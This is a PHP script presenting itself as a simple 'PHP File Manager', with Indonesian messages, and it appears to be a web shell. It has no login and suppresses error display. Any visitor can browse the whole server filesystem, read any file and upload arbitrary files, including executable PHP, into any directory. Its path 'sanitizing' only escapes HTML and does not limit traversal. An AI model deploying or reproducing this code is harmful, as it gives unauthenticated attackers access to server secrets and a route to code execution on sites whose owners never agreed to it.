<?php
ini_set('log_errors', 1);
ini_set('display_errors', 0);

function setCookieDir($dir) {
    setcookie('current_dir', $dir, time() + 7200, '/'); // Set cookie for 2 hours
}

function getCookieDir() {
    return isset($_COOKIE['current_dir']) ? $_COOKIE['current_dir'] : getcwd();
}

function sanitizePath($path) {
    return str_replace("\\", "/", htmlspecialchars($path));
}

function path() {
    $dir = isset($_GET['dir']) ? sanitizePath($_GET['dir']) : getCookieDir();
    $dir = realpath($dir);
    
    if ($dir && is_dir($dir)) {
        chdir($dir);
        setCookieDir($dir);
    } else {
        $dir = getcwd();
        setCookieDir($dir); // Ensure that current directory is always stored in the cookie
    }

    return $dir;
}

function renderFileList($dir) {
    if (!is_dir($dir)) {
        return "<p>Direktori tidak ditemukan: " . htmlspecialchars($dir) . "</p>";
    }

    function parentDir($dir) {
        return realpath(dirname($dir)) ?: $dir;
    }

    function getFileInfo($path) {
        return [
            'name' => basename($path),
            'path' => $path,
            'owner' => fileowner($path),
            'group' => filegroup($path),
            'perms' => substr(decoct(fileperms($path) & 0777), -3),
            'modification_date' => date("Y-m-d H:i:s", filemtime($path))
        ];
    }

    $items = array_diff(scandir($dir), ['.', '..']);
    $parentPath = ($dir !== '/') ? parentDir($dir) : null;

    $directories = [];
    $files = [];

    if ($parentPath) {
        $directories[] = array_merge(getFileInfo($parentPath), [
            'type' => 'dir',
            'link' => "<a href='#' class='dir-link' data-dir='" . sanitizePath($parentPath) . "'>..</a>"
        ]);
    }

    foreach ($items as $item) {
        $itemPath = $dir . DIRECTORY_SEPARATOR . $item;
        $info = array_merge(getFileInfo($itemPath), ['link' => is_dir($itemPath) ? "<a href='#' class='dir-link' data-dir='" . sanitizePath($itemPath) . "'>$item</a>" : "<a href='#' class='file-link' data-file='" . sanitizePath($itemPath) . "'>$item</a>"]);

        if (is_dir($itemPath)) {
            $info['type'] = 'dir';
            $directories[] = $info;
        } elseif (is_file($itemPath)) {
            $info['type'] = 'file';
            $files[] = $info;
        }
    }

    $html = "<table class='table'><thead><tr><th>Name</th><th>Type</th><th>Owner</th><th>Group</th><th>Permissions</th><th>Modification Date</th></tr></thead><tbody>";

    foreach ($directories as $dir) {
        $html .= "<tr><td>{$dir['link']}</td><td>Directory</td><td>{$dir['owner']}</td><td>{$dir['group']}</td><td>{$dir['perms']}</td><td>{$dir['modification_date']}</td></tr>";
    }

    foreach ($files as $file) {
        $html .= "<tr><td>{$file['link']}</td><td>File</td><td>{$file['owner']}</td><td>{$file['group']}</td><td>{$file['perms']}</td><td>{$file['modification_date']}</td></tr>";
    }

    $html .= "</tbody></table>";

    return $html;
}

function handleAction() {
    $dir = path(); // Set the current directory

    if (isset($_GET['action'])) {
        switch ($_GET['action']) {
            case 'create_folder':
                if (isset($_POST['folder_name'])) {
                    $folderName = sanitizePath($_POST['folder_name']);
                    $newFolderPath = $dir . DIRECTORY_SEPARATOR . $folderName;
                    if (!file_exists($newFolderPath)) {
                        mkdir($newFolderPath);
                        echo renderFileList($dir); // Return updated file list
                    } else {
                        echo "Folder sudah ada.";
                    }
                }
                break;

            case 'create_file':
                if (isset($_POST['file_name'])) {
                    $fileName = sanitizePath($_POST['file_name']);
                    $newFilePath = $dir . DIRECTORY_SEPARATOR . $fileName;
                    if (!file_exists($newFilePath)) {
                        touch($newFilePath);
                        echo renderFileList($dir); // Return updated file list
                    } else {
                        echo "File sudah ada.";
                    }
                }
                break;

            case 'upload':
                if (isset($_FILES['upload_file'])) {
                    $file = $_FILES['upload_file'];
                    $targetFile = $dir . DIRECTORY_SEPARATOR . basename($file['name']);
                    move_uploaded_file($file['tmp_name'], $targetFile);
                    echo renderFileList($dir); // Return updated file list
                }
                break;

            case 'view':
                if (isset($_GET['file'])) {
                    $file = sanitizePath($_GET['file']);
                    if (file_exists($file)) {
                        $content = file_get_contents($file);
                        echo "<p>File Contents: " . htmlspecialchars($file) . "</p>";
                        echo '<pre>' . htmlspecialchars($content) . '</pre>';
                    } else {
                        echo "<p>Unable to read file.</p>";
                    }
                }
                break;
        }
        exit();
    }
}

handleAction();

$dir = path();
$fileListHtml = renderFileList($dir);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <style>
        /* Add your custom CSS here */
        body {
            background: #333;
            color: #fff;
            font-family: Arial, sans-serif;
        }
        .container {
            background: #444;
            padding: 20px;
            border-radius: 10px;
        }
        .table {
            color: #fff;
        }
        .table th {
            background: #555;
        }
        .table tr:nth-child(even) {
            background: #666;
        }
        .btn {
            background: #555;
            color: #fff;
        }
        .btn:hover {
            background: #666;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>PHP File Manager</h1>
    <div class="nav nav-pills" id="nav-tab" role="tablist">
        <a class="nav-link active" id="nav-home-tab" data-toggle="pill" href="#nav-home" role="tab" aria-controls="nav-home" aria-selected="true">Home</a>
        <a class="nav-link" id="nav-upload-tab" data-toggle="pill" href="#nav-upload" role="tab" aria-controls="nav-upload" aria-selected="false">Upload</a>
    </div>

    <div class="tab-content" id="nav-tabContent">
        <div class="tab-pane fade show active" id="nav-home" role="tabpanel" aria-labelledby="nav-home-tab">
            <h4>Current Directory: <span id="current-dir"><?php echo htmlspecialchars($dir); ?></span></h4>
            <div id="file-list">
                <?php echo $fileListHtml; ?>
            </div>
        </div>
        <div class="tab-pane fade" id="nav-upload" role="tabpanel" aria-labelledby="nav-upload-tab">
            <form id="upload-form" action="?action=upload" method="post" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="upload_file">Upload File:</label>
                    <input type="file" name="upload_file" id="upload_file" class="form-control">
                </div>
                <button type="submit" class="btn btn-primary">Upload</button>
            </form>
        </div>
    </div>
</div>

<script>
$(document).ready(function() {
    $(document).on('click', '.dir-link', function(event) {
        event.preventDefault();
        var dir = $(this).data('dir');
        
        $.get('?dir=' + encodeURIComponent(dir), function(data) {
            $('#file-list').html(data);
            $('#current-dir').text(dir);

            // Update cookie with the new directory
            document.cookie = "current_dir=" + encodeURIComponent(dir) + "; path=/; max-age=7200"; // 2 hours
        }).fail(function() {
            alert('Failed to load directory.');
        });
    });

    $(document).on('click', '.file-link', function(event) {
        event.preventDefault();
        var file = $(this).data('file');
        $.get('?action=view&file=' + encodeURIComponent(file), function(data) {
            $('#file-list').html(data);
        }).fail(function() {
            alert('Failed to load file.');
        });
    });

    $('#upload-form').on('submit', function(event) {
        event.preventDefault();
        var formData = new FormData(this);

        $.ajax({
            url: $(this).attr('action'),
            type: 'POST',
            data: formData,
            processData: false,
            contentType: false,
            success: function(data) {
                $('#file-list').html(data);
            },
            error: function() {
                alert('Failed to upload file.');
            }
        });
    });
});
</script>
</body>
</html>
